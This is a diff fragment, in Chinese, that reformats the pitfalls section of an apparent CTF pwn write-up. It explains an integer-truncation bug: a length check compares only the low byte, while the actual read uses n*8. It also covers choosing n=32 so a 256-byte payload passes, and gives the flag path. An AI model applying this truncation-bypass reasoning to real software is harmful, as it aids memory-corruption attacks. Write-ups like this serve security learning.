+**别把 `cheque_bytes` 的返回值当完整长度。** 它内部是 `shl eax,3`（32 位），`main` 里又只取 `al` 去比较。真正读多少由 `main` 里的 `n*8`（64 位）决定。检查值和实际值分离，这就是坑。
 
-- **别把 `cheque_bytes` 的返回值当成完整长度**：它内部是 `shl eax,3`（32 位），main 里又只取 `al`（低 8 位）去比较。真正读多少字节由 `main` 里的 `n*8`（64 位）决定。检查值和实际值分离，是本题的坑点。
-- **`n=32` 不是随便选的**：`n*8` 在 `128~255` 区间的低字节都 `>0x60`，过不了检查，必须跨到 `256` 这一档。
-- **`read_exact` 要读满**：它会读满 `n*8` 字节才返回，所以 payload 必须凑够 256 字节（后面用 `'B'` 补齐），否则会阻塞。
-- **flag 在 `/flag`**：不是 `/app/flag`。
+**`n=32` 不是随便选的。** `n*8` 在 `128~255` 区间的低字节都 `>0x60`，过不了检查，必须跨到 `256` 这一档。
+
+**`read_exact` 要读满。** 它会读满 `n*8` 字节才返回，所以 payload 必须凑够 256 字节，否则会阻塞。
+
+**flag 在 `/flag`**，不是 `/app/flag`。
 
 ---
 
